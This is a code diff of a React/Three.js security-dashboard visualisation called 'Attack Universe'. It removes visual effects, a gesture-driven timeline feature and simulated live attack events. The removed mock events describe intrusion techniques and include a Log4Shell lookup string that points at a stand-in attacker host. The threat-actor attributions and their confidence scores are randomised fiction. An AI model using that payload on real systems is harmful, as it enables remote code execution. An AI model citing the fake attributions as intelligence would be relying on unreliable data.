@@ -101,13 +101,6 @@ const AttackUniverse = () => {
   const [shockwaveActive, setShockwaveActive] = useState(false);
   const [twoHandsDetected, setTwoHandsDetected] = useState(false);
   const [showGestureTutorial, setShowGestureTutorial] = useState(true);
-  const [liveEvents, setLiveEvents] = useState<{ ts: string; type: string; src: string; dst: string; severity: string; detail: string }[]>([]);
-  const [activeThreatActor, setActiveThreatActor] = useState({ name: 'APT-29 (Cozy Bear)', confidence: 92 });
-  const [timelineOffset, setTimelineOffset] = useState(0); // -1 = past, 0 = now, +1 = future
-  const [timelineMode, setTimelineMode] = useState<'past' | 'present' | 'future'>('present');
-  const [timelineEvents, setTimelineEvents] = useState<{ id: number; ts: string; type: string; domain: string; detail: string; severity: string; x: number; y: number }[]>([]);
-  const [monteCarloLines, setMonteCarloLines] = useState<{ id: number; label: string; probability: number; impact: string; color: string }[]>([]);
-  const [selectedEvent, setSelectedEvent] = useState<{ id: number; ts: string; type: string; domain: string; detail: string; severity: string } | null>(null);
 
   const severityRef = useRef(severity);
   const selectedIdxRef = useRef(-1);
@@ -339,7 +332,7 @@ const AttackUniverse = () => {
       }
 
     } else if (extendedCount === 4) {
-      // OPEN PALM = Timeline Scrub (horizontal) or Force Push (fast motion)
+      // OPEN PALM = Force Push/Pull
       setIsBeaming(false);
       laserLine.visible = false;
       setIsGrabbing(false);
@@ -352,9 +345,9 @@ const AttackUniverse = () => {
       const vel = handVelocityRef.current;
       const speed = Math.sqrt(vel.x * vel.x + vel.y * vel.y);
 
-      if (speed > 0.03) {
-        // Fast swipe = Force Push
+      if (speed > 0.015) {
         setHandGesture('FORCE PUSH');
+        // Push all domains away from hand position
         domainMeshes.forEach((mesh, idx) => {
           const meshScreen = mesh.position.clone().project(camera);
           const dx = meshScreen.x - handVec.x;
@@ -369,19 +362,11 @@ const AttackUniverse = () => {
           }
         });
       } else {
-        // Slow open palm = Timeline scrub by X position
-        const timeX = (mirroredX - 0.5) * 2; // -1 to +1
-        setTimelineOffset(timeX);
-        if (timeX < -0.3) {
-          setTimelineMode('future');
-          setHandGesture('TIMELINE - FUTURE (Monte Carlo)');
-        } else if (timeX > 0.3) {
-          setTimelineMode('past');
-          setHandGesture('TIMELINE - PAST (History)');
-        } else {
-          setTimelineMode('present');
-          setHandGesture('TIMELINE - NOW');
-        }
+        setHandGesture('OPEN - Navigate');
+        const dx = (mirroredX - 0.5) * 4;
+        const dy = (palmY - 0.5) * 2;
+        controls.autoRotateSpeed = dx;
+        camera.position.y += (dy * 3 + 1 - camera.position.y) * 0.03;
       }
 
     } else if (extendedCount === 2 && fingersExtended[0] && fingersExtended[1]) {
@@ -652,233 +637,47 @@ const AttackUniverse = () => {
     const coreLight = new THREE.PointLight(sevConfig.color.getHex(), 2.5, 6);
     scene.add(coreLight);
 
-    // Domain nodes - Advanced 3D with layered geometry and custom shaders
+    // Domain nodes
     const domainMeshes: THREE.Mesh[] = [];
     const domainRings: THREE.Mesh[] = [];
-    const domainExtras: { shells: THREE.Mesh[]; particles: THREE.Points; hexGrid: THREE.LineSegments; innerRing: THREE.Mesh; outerRing: THREE.Mesh; disc: THREE.Mesh }[] = [];
     const orbitRadius = 2.8;
-
-    // Custom fresnel shader for energy shells
-    const fresnelVertexShader = `
-      varying vec3 vNormal;
-      varying vec3 vViewDir;
-      varying vec2 vUv;
-      void main() {
-        vUv = uv;
-        vec4 mvPos = modelViewMatrix * vec4(position, 1.0);
-        vNormal = normalize(normalMatrix * normal);
-        vViewDir = normalize(-mvPos.xyz);
-        gl_Position = projectionMatrix * mvPos;
-      }
-    `;
-    const fresnelFragmentShader = `
-      uniform vec3 uColor;
-      uniform float uTime;
-      uniform float uIntensity;
-      uniform float uPressure;
-      varying vec3 vNormal;
-      varying vec3 vViewDir;
-      varying vec2 vUv;
-      void main() {
-        float fresnel = pow(1.0 - dot(vNormal, vViewDir), 3.0);
-        float pulse = 0.8 + 0.2 * sin(uTime * 2.0 + vUv.y * 6.28);
-        float energyBand = smoothstep(0.4, 0.6, sin(vUv.y * 12.0 + uTime * 1.5)) * 0.3;
-        float glow = fresnel * uIntensity * pulse + energyBand * uPressure;
-        vec3 finalColor = uColor * (1.0 + fresnel * 2.0);
-        gl_FragColor = vec4(finalColor, glow * 0.85);
-      }
-    `;
-
-    // Hex grid vertex/fragment for holographic disc
-    const hexDiscVertexShader = `
-      varying vec2 vUv;
-      void main() {
-        vUv = uv;
-        gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
-      }
-    `;
-    const hexDiscFragmentShader = `
-      uniform vec3 uColor;
-      uniform float uTime;
-      uniform float uOpacity;
-      varying vec2 vUv;
-      void main() {
-        vec2 p = (vUv - 0.5) * 2.0;
-        float dist = length(p);
-        float ring1 = smoothstep(0.02, 0.0, abs(dist - 0.6 - 0.05 * sin(uTime * 2.0)));
-        float ring2 = smoothstep(0.015, 0.0, abs(dist - 0.85));
-        float scanLine = smoothstep(0.01, 0.0, abs(fract(p.y * 8.0 + uTime * 0.5) - 0.5) - 0.48) * 0.3;
-        float alpha = (ring1 * 0.8 + ring2 * 0.5 + scanLine) * uOpacity * smoothstep(1.0, 0.7, dist);
-        gl_FragColor = vec4(uColor, alpha);
-      }
-    `;
 
     DOMAINS.forEach((domain, idx) => {
       const angle = (idx / DOMAINS.length) * Math.PI * 2;
       const nodeSize = domain.active ? 0.22 + (domain.pressure / 600) : 0.15;
-      const color = new THREE.Color(domain.color);
 
-      // Layer 1: Inner core - solid glass sphere with refraction-like effect
-      const coreGeoD = new THREE.SphereGeometry(nodeSize * 0.6, 48, 48);
-      const coreMatD = new THREE.MeshPhongMaterial({
-        color: color.clone().multiplyScalar(0.4),
-        emissive: color,
-        emissiveIntensity: domain.active ? 0.8 : 0.2,
-        transparent: true,
-        opacity: domain.active ? 0.9 : 0.4,
-        shininess: 200,
-        specular: new THREE.Color(0xffffff),
+      const geo = new THREE.SphereGeometry(nodeSize, 32, 32);
+      const mat = new THREE.MeshPhongMaterial({
+        color: new THREE.Color(domain.color),
+        emissive: new THREE.Color(domain.color),
+        emissiveIntensity: domain.active ? 0.4 : 0.1,
+        transparent: true, opacity: domain.active ? 0.95 : 0.5, shininess: 60,
       });
-      const coreMeshD = new THREE.Mesh(coreGeoD, coreMatD);
-
-      // Layer 2: Energy shell with fresnel shader
-      const shellGeo = new THREE.SphereGeometry(nodeSize, 48, 48);
-      const shellMat = new THREE.ShaderMaterial({
-        vertexShader: fresnelVertexShader,
-        fragmentShader: fresnelFragmentShader,
-        uniforms: {
-          uColor: { value: color },
-          uTime: { value: 0 },
-          uIntensity: { value: domain.active ? 1.2 : 0.4 },
-          uPressure: { value: domain.pressure / 100 },
-        },
-        transparent: true,
-        side: THREE.FrontSide,
-        depthWrite: false,
-        blending: THREE.AdditiveBlending,
-      });
-      const shellMesh = new THREE.Mesh(shellGeo, shellMat);
-
-      // Layer 3: Outer atmosphere glow
-      const atmosGeo = new THREE.SphereGeometry(nodeSize * 1.4, 32, 32);
-      const atmosMat = new THREE.ShaderMaterial({
-        vertexShader: fresnelVertexShader,
-        fragmentShader: fresnelFragmentShader,
-        uniforms: {
-          uColor: { value: color.clone().multiplyScalar(0.6) },
-          uTime: { value: 0 },
-          uIntensity: { value: domain.active ? 0.6 : 0.15 },
-          uPressure: { value: domain.pressure / 200 },
-        },
-        transparent: true,
-        side: THREE.BackSide,
-        depthWrite: false,
-        blending: THREE.AdditiveBlending,
-      });
-      const atmosMesh = new THREE.Mesh(atmosGeo, atmosMat);
-
-      // Combine into group via a parent mesh (use shell as the main hittable mesh)
-      const groupMesh = new THREE.Mesh(new THREE.SphereGeometry(nodeSize * 1.1, 16, 16), new THREE.MeshBasicMaterial({ visible: false }));
-      groupMesh.add(coreMeshD);
-      groupMesh.add(shellMesh);
-      groupMesh.add(atmosMesh);
-
-      groupMesh.position.set(
+      const mesh = new THREE.Mesh(geo, mat);
+      mesh.position.set(
         Math.cos(angle) * orbitRadius,
         Math.sin(angle * 0.5) * 0.3,
         Math.sin(angle) * orbitRadius
       );
-      groupMesh.userData = { domainIdx: idx, baseY: groupMesh.position.y };
-      scene.add(groupMesh);
-      domainMeshes.push(groupMesh);
+      mesh.userData = { domainIdx: idx, baseY: mesh.position.y };
+      scene.add(mesh);
+      domainMeshes.push(mesh);
 
-      domainOrigPosRef.current[idx] = groupMesh.position.clone();
+      domainOrigPosRef.current[idx] = mesh.position.clone();
       domainDisplaceRef.current[idx] = new THREE.Vector3();
 
-      // Holographic disc (horizontal ring under the sphere)
-      const discGeo = new THREE.PlaneGeometry(nodeSize * 4, nodeSize * 4);
-      const discMat = new THREE.ShaderMaterial({
-        vertexShader: hexDiscVertexShader,
-        fragmentShader: hexDiscFragmentShader,
-        uniforms: {
-          uColor: { value: color },
-          uTime: { value: 0 },
-          uOpacity: { value: domain.active ? 0.6 : 0.2 },
-        },
-        transparent: true,
-        side: THREE.DoubleSide,
-        depthWrite: false,
-        blending: THREE.AdditiveBlending,
-      });
-      const disc = new THREE.Mesh(discGeo, discMat);
-      disc.rotation.x = -Math.PI / 2;
-      disc.position.copy(groupMesh.position);
-      disc.position.y -= nodeSize * 0.3;
-      scene.add(disc);
-
-      // Orbiting particle ring
-      const particleCount = domain.active ? 60 : 20;
-      const particleGeo = new THREE.BufferGeometry();
-      const pPositions = new Float32Array(particleCount * 3);
-      const pSizes = new Float32Array(particleCount);
-      for (let i = 0; i < particleCount; i++) {
-        const a = (i / particleCount) * Math.PI * 2;
-        const r = nodeSize * (1.6 + Math.random() * 0.4);
-        pPositions[i * 3] = Math.cos(a) * r;
-        pPositions[i * 3 + 1] = (Math.random() - 0.5) * nodeSize * 0.6;
-        pPositions[i * 3 + 2] = Math.sin(a) * r;
-        pSizes[i] = 0.01 + Math.random() * 0.02;
-      }
-      particleGeo.setAttribute('position', new THREE.BufferAttribute(pPositions, 3));
-      particleGeo.setAttribute('size', new THREE.BufferAttribute(pSizes, 1));
-      const particleMat = new THREE.PointsMaterial({
-        color: color,
-        size: 0.025,
-        transparent: true,
-        opacity: domain.active ? 0.8 : 0.3,
-        blending: THREE.AdditiveBlending,
-        depthWrite: false,
-      });
-      const particles = new THREE.Points(particleGeo, particleMat);
-      particles.position.copy(groupMesh.position);
-      scene.add(particles);
-
-      // Inner spinning ring (tilted)
-      const innerRingGeo = new THREE.TorusGeometry(nodeSize * 1.2, 0.008, 8, 64);
-      const innerRingMat = new THREE.MeshBasicMaterial({
-        color: color, transparent: true, opacity: domain.active ? 0.7 : 0.2,
-      });
-      const innerRing = new THREE.Mesh(innerRingGeo, innerRingMat);
-      innerRing.position.copy(groupMesh.position);
-      innerRing.rotation.x = Math.PI * 0.3;
-      innerRing.rotation.z = Math.PI * 0.15 * idx;
-      scene.add(innerRing);
-
-      // Outer spinning ring (opposite tilt)
-      const outerRingGeo = new THREE.TorusGeometry(nodeSize * 1.6, 0.005, 8, 64);
-      const outerRingMat = new THREE.MeshBasicMaterial({
-        color: color, transparent: true, opacity: domain.active ? 0.4 : 0.1,
-      });
-      const outerRing = new THREE.Mesh(outerRingGeo, outerRingMat);
-      outerRing.position.copy(groupMesh.position);
-      outerRing.rotation.x = -Math.PI * 0.4;
-      outerRing.rotation.z = -Math.PI * 0.2 * idx;
-      scene.add(outerRing);
-
-      // Hex grid wireframe (icosahedron as structural cage)
-      const hexGeo = new THREE.IcosahedronGeometry(nodeSize * 1.3, 1);
-      const hexEdges = new THREE.EdgesGeometry(hexGeo);
-      const hexLine = new THREE.LineSegments(hexEdges, new THREE.LineBasicMaterial({
-        color: color, transparent: true, opacity: domain.active ? 0.25 : 0.08,
-      }));
-      hexLine.position.copy(groupMesh.position);
-      scene.add(hexLine);
-
-      domainExtras.push({ shells: [shellMesh, atmosMesh], particles, hexGrid: hexLine, innerRing, outerRing, disc });
-
-      // Selection ring (used by hover/selection logic)
-      const ringGeo = new THREE.RingGeometry(nodeSize * 2.0, nodeSize * 2.3, 48);
+      const ringGeo = new THREE.RingGeometry(nodeSize * 1.5, nodeSize * 1.8, 32);
       const ringMat = new THREE.MeshBasicMaterial({
-        color: color, transparent: true, opacity: 0, side: THREE.DoubleSide,
+        color: new THREE.Color(domain.color), transparent: true, opacity: 0, side: THREE.DoubleSide,
       });
       const ring = new THREE.Mesh(ringGeo, ringMat);
-      ring.position.copy(groupMesh.position);
+      ring.position.copy(mesh.position);
       scene.add(ring);
       domainRings.push(ring);
 
       if (domain.active) {
-        const light = new THREE.PointLight(color.getHex(), 0.6, 2.5);
-        light.position.copy(groupMesh.position);
+        const light = new THREE.PointLight(new THREE.Color(domain.color).getHex(), 0.3, 1.8);
+        light.position.copy(mesh.position);
         scene.add(light);
       }
     });
@@ -973,11 +772,9 @@ const AttackUniverse = () => {
         if (selectedIdxRef.current === idx) {
           setSelectedDomain(null);
           selectedIdxRef.current = -1;
-          setLiveEvents([]);
         } else {
           setSelectedDomain(DOMAINS[idx]);
           selectedIdxRef.current = idx;
-          setLiveEvents([]);
         }
       }
     };
@@ -1014,16 +811,21 @@ const AttackUniverse = () => {
       (coreGlow.material as THREE.MeshBasicMaterial).color.lerp(sev.color, 0.02);
       coreLight.color.lerp(sev.color, 0.02);
 
-      // Domain positions with spring physics + animate extras
+      // Domain positions with spring physics
       domainMeshes.forEach((mesh, idx) => {
         const orig = domainOrigPosRef.current[idx];
         const displace = domainDisplaceRef.current[idx];
 
         if (orig && displace) {
+          // Spring back toward original position
           displace.x *= 0.94;
           displace.y *= 0.94;
           displace.z *= 0.94;
-          if (displace.length() < 0.001) displace.set(0, 0, 0);
+
+          if (displace.length() < 0.001) {
+            displace.set(0, 0, 0);
+          }
+
           mesh.position.set(
             orig.x + displace.x,
             orig.y + displace.y + Math.sin(elapsed * 0.7 + idx) * 0.08,
@@ -1036,36 +838,6 @@ const AttackUniverse = () => {
         mesh.rotation.y += 0.006;
         domainRings[idx].position.copy(mesh.position);
         domainRings[idx].lookAt(camera.position);
-
-        // Animate domain extras
-        const extras = domainExtras[idx];
-        if (extras) {
-          // Update shader uniforms
-          extras.shells.forEach((shell) => {
-            const mat = shell.material as THREE.ShaderMaterial;
-            if (mat.uniforms?.uTime) mat.uniforms.uTime.value = elapsed;
-          });
-          // Spin inner ring
-          extras.innerRing.position.copy(mesh.position);
-          extras.innerRing.rotation.y += 0.02;
-          extras.innerRing.rotation.x += 0.005;
-          // Spin outer ring opposite direction
-          extras.outerRing.position.copy(mesh.position);
-          extras.outerRing.rotation.y -= 0.012;
-          extras.outerRing.rotation.z += 0.003;
-          // Rotate orbiting particles
-          extras.particles.position.copy(mesh.position);
-          extras.particles.rotation.y += 0.008;
-          // Rotate hex grid slowly
-          extras.hexGrid.position.copy(mesh.position);
-          extras.hexGrid.rotation.x += 0.003;
-          extras.hexGrid.rotation.y += 0.005;
-          // Animate holographic disc
-          extras.disc.position.copy(mesh.position);
-          extras.disc.position.y -= 0.08;
-          const discMat = extras.disc.material as THREE.ShaderMaterial;
-          if (discMat.uniforms?.uTime) discMat.uniforms.uTime.value = elapsed;
-        }
       });
 
       // Shockwave animation
@@ -1174,76 +946,6 @@ const AttackUniverse = () => {
       setTotalAttacks(prev => prev + (Math.random() > 0.6 ? 1 : 0));
     }, 4000);
 
-    // Threat actor rotation
-    const THREAT_ACTORS = [
-      { name: 'APT-29 (Cozy Bear)', confidence: 92 },
-      { name: 'APT-28 (Fancy Bear)', confidence: 87 },
-      { name: 'Lazarus Group', confidence: 78 },
-      { name: 'FIN7 (Carbanak)', confidence: 85 },
-      { name: 'Scattered Spider', confidence: 71 },
-      { name: 'APT-41 (Winnti)', confidence: 89 },
-      { name: 'REvil / Sodinokibi', confidence: 65 },
-      { name: 'Sandworm (Voodoo Bear)', confidence: 83 },
-      { name: 'Volt Typhoon', confidence: 76 },
-      { name: 'BlackCat (ALPHV)', confidence: 69 },
-    ];
-    const threatInt = setInterval(() => {
-      const actor = THREAT_ACTORS[Math.floor(Math.random() * THREAT_ACTORS.length)];
-      setActiveThreatActor({ name: actor.name, confidence: actor.confidence + Math.floor(Math.random() * 6 - 3) });
-    }, 8000);
-
-    // Live event generation - always active (domain-specific when selected)
-    const eventInt = setInterval(() => {
-      const domain = selectedIdxRef.current >= 0
-        ? DOMAINS[selectedIdxRef.current]
-        : DOMAINS[Math.floor(Math.random() * DOMAINS.length)];
-      const eventTemplates: Record<string, { type: string; src: string; dst: string; detail: string }[]> = {
-        identity: [
-          { type: 'AUTH_FAIL', src: '10.42.8.201', dst: 'DC-01.corp.local', detail: 'Kerberos TGT request failed - invalid credentials (5x in 30s)' },
-          { type: 'PRIV_ESC', src: 'svc_backup', dst: 'AD-CS-01', detail: 'Certificate template abuse - SubjectAltName manipulation' },
-          { type: 'GOLDEN_TKT', src: '10.42.12.55', dst: 'krbtgt', detail: 'Anomalous TGS-REP encryption type (RC4-HMAC from AES-only env)' },
-          { type: 'ENUM', src: '10.42.6.130', dst: 'LDAP://corp.local', detail: 'BloodHound-like LDAP queries - AdminCount=1 enumeration' },
-        ],
-        endpoint: [
-          { type: 'PROC_INJ', src: 'WKS-FIN042', dst: 'lsass.exe', detail: 'NtCreateThreadEx injection into LSASS - Mimikatz signature' },
-          { type: 'LOLBin', src: 'WKS-HR019', dst: 'mshta.exe', detail: 'MSHTA executing remote HTA payload from temp directory' },
-          { type: 'RANSOMWARE', src: 'SRV-DB03', dst: 'vssadmin.exe', detail: 'Shadow copy deletion followed by mass .encrypted extension writes' },
-          { type: 'PERSIST', src: 'WKS-ENG007', dst: 'schtasks.exe', detail: 'Scheduled task creation with base64-encoded PowerShell payload' },
-        ],
-        network: [
-          { type: 'C2_BEACON', src: '10.42.9.88', dst: '185.220.101.42', detail: 'Periodic HTTPS beaconing (60s jitter) to known Cobalt Strike IP' },
-          { type: 'DNS_TUNNEL', src: '10.42.3.14', dst: 'ns1.evil-cdn.xyz', detail: 'DNS TXT queries with base64 payload - 340 queries in 5min' },
-          { type: 'LATERAL', src: '10.42.8.201', dst: '10.42.12.55', detail: 'SMB/PSExec lateral movement - ADMIN$ share access' },
-          { type: 'EXFIL', src: '10.42.11.200', dst: '104.16.99.200', detail: 'Chunked HTTPS POST 2.3GB to Cloudflare-fronted C2 endpoint' },
-        ],
-        application: [
-          { type: 'SQLI', src: '203.0.113.42', dst: 'api.corp.com/v2/users', detail: 'Union-based SQL injection in search parameter - data extraction' },
-          { type: 'SSRF', src: 'web-app-03', dst: 'http://169.254.169.254', detail: 'SSRF to AWS IMDS - IAM role credentials accessed' },
-          { type: 'RCE', src: '198.51.100.77', dst: 'jira.corp.com', detail: 'Log4Shell exploitation attempt - ${jndi:ldap://attacker.com/a}' },
-        ],
-        cloud: [
-          { type: 'IAM_ABUSE', src: 'lambda-exec-role', dst: 'sts:AssumeRole', detail: 'Cross-account role assumption to production - unusual source IP' },
-          { type: 'S3_EXFIL', src: 'arn:aws:iam::*:role/dev', dst: 's3://finance-reports', detail: 'Bulk S3 GetObject from dev role to finance bucket (2,847 objects)' },
-          { type: 'CRYPTO_MINE', src: 'i-0a1b2c3d4e5f', dst: 'pool.minergate.com', detail: 'EC2 instance communicating with crypto mining pool' },
-        ],
-        data: [
-          { type: 'DLP_VIOL', src: 'user.exec@corp.com', dst: 'personal-gdrive', detail: 'SSN patterns detected in 4 files uploaded to personal cloud' },
-          { type: 'DB_DUMP', src: '10.42.12.55', dst: 'pgsql-prod-01', detail: 'Full table dump of PII_customers - 2.1M rows exported in 4min' },
-          { type: 'ENCRYPT', src: 'SRV-FILE01', dst: '*.docx, *.xlsx', detail: 'Mass file encryption detected - 14,000 files in 90 seconds' },
-        ],
-        physical: [
-          { type: 'TAILGATE', src: 'CAM-LOBBY-02', dst: 'Main entrance', detail: 'Unauthorized entry detected - no badge scan within 5s of door open' },
-          { type: 'BADGE_ANOM', src: 'Badge#4421', dst: 'Server Room B', detail: 'Badge used simultaneously at 2 locations 400m apart' },
-        ],
-      };
-      const templates = eventTemplates[domain.id] || eventTemplates['network'];
-      const tmpl = templates[Math.floor(Math.random() * templates.length)];
-      const now = new Date();
-      const ts = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}.${now.getMilliseconds().toString().padStart(3, '0')}`;
-      const sevs = ['CRITICAL', 'HIGH', 'MEDIUM', 'HIGH', 'CRITICAL'];
-      setLiveEvents(prev => [{ ts, ...tmpl, severity: sevs[Math.floor(Math.random() * sevs.length)] }, ...prev].slice(0, 8));
-    }, 2200);
-
     return () => {
       cancelAnimationFrame(sceneDataRef.current?.animId || 0);
       container.removeEventListener('mousemove', onMouseMove);
@@ -1251,8 +953,6 @@ const AttackUniverse = () => {
       container.removeEventListener('dblclick', onDblClick);
       window.removeEventListener('resize', onResize);
       clearInterval(dataInt);
-      clearInterval(threatInt);
-      clearInterval(eventInt);
       controls.dispose();
       renderer.dispose();
       if (container.contains(renderer.domElement)) container.removeChild(renderer.domElement);
@@ -1272,50 +972,6 @@ const AttackUniverse = () => {
       }
     }, 50);
   }, [isFullscreen]);
-
-  // Generate timeline events and Monte Carlo projections
-  useEffect(() => {
-    if (timelineMode === 'past') {
-      const pastEvents = [];
-      const pastTypes = ['AUTH_FAIL', 'C2_BEACON', 'LATERAL_MOV', 'PRIV_ESC', 'DATA_STAGING', 'EXFIL_PREP', 'RECON', 'CREDENTIAL_DUMP'];
-      const domains = ['identity', 'endpoint', 'network', 'cloud', 'data'];
-      const sources = ['10.42.8.201', 'WKS-FIN042', 'SRV-DB03', '10.42.12.55', '10.42.3.14'];
-      for (let i = 0; i < 12; i++) {
-        const minutesAgo = Math.floor(Math.abs(timelineOffset) * 60 + i * 5);
-        const h = new Date(Date.now() - minutesAgo * 60000);
-        pastEvents.push({
-          id: i,
-          ts: `${h.getHours().toString().padStart(2, '0')}:${h.getMinutes().toString().padStart(2, '0')}:${h.getSeconds().toString().padStart(2, '0')}`,
-          type: pastTypes[i % pastTypes.length],
-          domain: domains[i % domains.length],
-          detail: `${sources[i % sources.length]} → ${['DC-01.corp', 'krbtgt', 'ADMIN$', '185.220.101.42', 's3://finance'][i % 5]} | Kill chain stage ${Math.min(7, Math.floor(i / 1.5) + 1)}/7`,
-          severity: i < 3 ? 'HIGH' : i < 6 ? 'CRITICAL' : 'MEDIUM',
-          x: 0.1 + (i % 4) * 0.22,
-          y: 0.15 + Math.floor(i / 4) * 0.28,
-        });
-      }
-      setTimelineEvents(pastEvents);
-      setMonteCarloLines([]);
-    } else if (timelineMode === 'future') {
-      const predictions = [
-        { id: 1, label: 'Ransomware Deployment', probability: 73, impact: 'CATASTROPHIC', color: '#ef4444' },
-        { id: 2, label: 'Data Exfiltration Complete', probability: 61, impact: 'CRITICAL', color: '#f97316' },
-        { id: 3, label: 'Lateral to Finance Subnet', probability: 84, impact: 'HIGH', color: '#eab308' },
-        { id: 4, label: 'Domain Admin Compromise', probability: 45, impact: 'CATASTROPHIC', color: '#ef4444' },
-        { id: 5, label: 'Cloud Persistence Established', probability: 56, impact: 'HIGH', color: '#f97316' },
-        { id: 6, label: 'Supply Chain Pivot', probability: 22, impact: 'MEDIUM', color: '#06b6d4' },
-        { id: 7, label: 'Wiper Malware Activation', probability: 18, impact: 'CATASTROPHIC', color: '#ef4444' },
-        { id: 8, label: 'Credential Marketplace Sale', probability: 38, impact: 'HIGH', color: '#eab308' },
-      ];
-      const depth = Math.abs(timelineOffset);
-      const visible = predictions.slice(0, Math.min(8, Math.ceil(depth * 8)));
-      setMonteCarloLines(visible.map(p => ({ ...p, probability: Math.min(99, p.probability + Math.floor(depth * 15)) })));
-      setTimelineEvents([]);
-    } else {
-      setTimelineEvents([]);
-      setMonteCarloLines([]);
-    }
-  }, [timelineMode, timelineOffset]);
 
   const sevConfig = getSeverityConfig(severity);
 
@@ -1377,7 +1033,7 @@ const AttackUniverse = () => {
               </div>
               <div className="flex items-center gap-2">
                 <span className="text-lg">&#9995;</span>
-                <span className="text-slate-300"><span className="text-white font-bold">Open</span> = Timeline Scrub</span>
+                <span className="text-slate-300"><span className="text-white font-bold">Open</span> = Force Push</span>
               </div>
               <div className="flex items-center gap-2">
                 <Zap className="w-3.5 h-3.5 text-yellow-400" />
@@ -1477,62 +1133,62 @@ const AttackUniverse = () => {
         </div>
       )}
 
-      {/* Top Header - Minority Report style */}
-      <div className="absolute top-0 left-0 right-0 z-10 px-5 py-4 bg-gradient-to-b from-[#030810]/90 via-[#030810]/40 to-transparent">
+      {/* Top Header */}
+      <div className="absolute top-0 left-0 right-0 z-10 px-5 py-4 bg-gradient-to-b from-[#030810]/95 to-transparent">
         <div className="flex items-center justify-between">
           <div>
             <div className="flex items-center gap-2">
-              <div className="w-2 h-2 rounded-full animate-pulse" style={{ backgroundColor: sevConfig.hex, boxShadow: `0 0 12px ${sevConfig.hex}` }} />
-              <h2 className="text-xs font-bold text-white/80 uppercase tracking-[0.2em] font-mono">Attack Universe</h2>
+              <div className="w-2.5 h-2.5 rounded-full animate-pulse" style={{ backgroundColor: sevConfig.hex, boxShadow: `0 0 8px ${sevConfig.hex}` }} />
+              <h2 className="text-sm font-bold text-white uppercase tracking-widest">Attack Universe</h2>
               {handTrackingOn && (
-                <span className="px-2 py-0.5 rounded text-[8px] font-mono font-bold bg-cyan-500/5 border border-cyan-500/20 text-cyan-400/80 uppercase">
-                  HAND CTRL
+                <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 uppercase">
+                  Hand Control
                 </span>
               )}
               {shockwaveActive && (
-                <span className="px-2 py-0.5 rounded text-[8px] font-mono font-bold bg-yellow-500/5 border border-yellow-500/20 text-yellow-400 uppercase animate-pulse">
-                  SHOCKWAVE
+                <span className="px-2 py-0.5 rounded text-[9px] font-bold bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 uppercase animate-pulse">
+                  Shockwave
                 </span>
               )}
             </div>
-            <p className="text-[10px] text-slate-600 mt-0.5 font-mono tracking-wide">
+            <p className="text-xs text-slate-500 mt-0.5">
               {handTrackingOn
-                ? 'POINT=BEAM | FIST=GRAB | PALM=TIMELINE | PEACE=LINK | PINCH=SELECT | CLAP=SHOCKWAVE'
-                : 'DRAG=ORBIT // CLICK=INSPECT // SCROLL=ZOOM // DBLCLICK=FOCUS'}
+                ? 'Point=Beam | Fist=Grab | Palm=Push | Peace=Link | Pinch=Select | Clap=Shockwave'
+                : 'Drag to orbit - Click to inspect - Scroll to zoom - Double-click to focus'}
             </p>
           </div>
-          <div className="flex items-center gap-5">
+          <div className="flex items-center gap-4">
             <div className="text-right">
-              <div className="text-[8px] text-slate-600 uppercase font-mono tracking-wider">Threat Level</div>
-              <div className="text-sm font-mono font-black tracking-wider" style={{ color: sevConfig.hex, textShadow: `0 0 10px ${sevConfig.hex}40` }}>{severity.toUpperCase()}</div>
+              <div className="text-[10px] text-slate-500 uppercase">Status</div>
+              <div className="text-lg font-black" style={{ color: sevConfig.hex }}>{severity.toUpperCase()}</div>
             </div>
             <div className="text-right">
-              <div className="text-[8px] text-slate-600 uppercase font-mono tracking-wider">Attacks</div>
-              <div className="text-sm font-mono font-black text-white/90">{totalAttacks}</div>
+              <div className="text-[10px] text-slate-500 uppercase">Attacks</div>
+              <div className="text-lg font-black text-white">{totalAttacks}</div>
             </div>
             <div className="text-right">
-              <div className="text-[8px] text-slate-600 uppercase font-mono tracking-wider">Core Energy</div>
-              <div className="text-sm font-mono font-black text-cyan-400/90">{coreEnergy.toFixed(1)}%</div>
+              <div className="text-[10px] text-slate-500 uppercase">Energy</div>
+              <div className="text-lg font-black text-cyan-400">{coreEnergy}%</div>
             </div>
           </div>
         </div>
       </div>
 
-      {/* Control Buttons - translucent glass */}
+      {/* Control Buttons */}
       <div className="absolute top-20 right-4 z-30 flex flex-col gap-2">
         <button
           onClick={toggleFullscreen}
-          className="p-2.5 rounded-lg border border-white/[0.06] bg-[#040c1a]/50 text-slate-500 hover:text-cyan-400 hover:border-cyan-500/20 transition-all backdrop-blur-xl"
+          className="p-2.5 rounded-lg border border-slate-600/40 bg-slate-900/70 text-slate-400 hover:text-white hover:border-white/20 transition-all backdrop-blur-sm"
           title={isFullscreen ? 'Exit fullscreen' : 'Maximize'}
         >
           {isFullscreen ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
         </button>
         <button
           onClick={handTrackingOn ? stopHandTracking : startHandTracking}
-          className={`p-2.5 rounded-lg border transition-all backdrop-blur-xl ${
+          className={`p-2.5 rounded-lg border transition-all backdrop-blur-sm ${
             handTrackingOn
-              ? 'border-cyan-500/30 bg-cyan-500/5 text-cyan-400 shadow-lg shadow-cyan-500/10'
-              : 'border-white/[0.06] bg-[#040c1a]/50 text-slate-500 hover:text-cyan-400 hover:border-cyan-500/20'
+              ? 'border-cyan-500/50 bg-cyan-500/10 text-cyan-400 shadow-lg shadow-cyan-500/20'
+              : 'border-slate-600/40 bg-slate-900/70 text-slate-400 hover:text-cyan-400 hover:border-cyan-500/30'
           }`}
           title={handTrackingOn ? 'Disable hand tracking' : 'Enable hand tracking (webcam)'}
         >
@@ -1545,7 +1201,7 @@ const AttackUniverse = () => {
               sceneDataRef.current.camera.position.set(0, 2.5, 6.5);
             }
           }}
-          className="p-2.5 rounded-lg border border-white/[0.06] bg-[#040c1a]/50 text-slate-500 hover:text-cyan-400 hover:border-cyan-500/20 transition-all backdrop-blur-xl"
+          className="p-2.5 rounded-lg border border-slate-600/40 bg-slate-900/70 text-slate-400 hover:text-white hover:border-white/20 transition-all backdrop-blur-sm"
           title="Reset camera"
         >
           <RotateCcw className="w-4 h-4" />
@@ -1570,377 +1226,79 @@ const AttackUniverse = () => {
         )}
       </div>
 
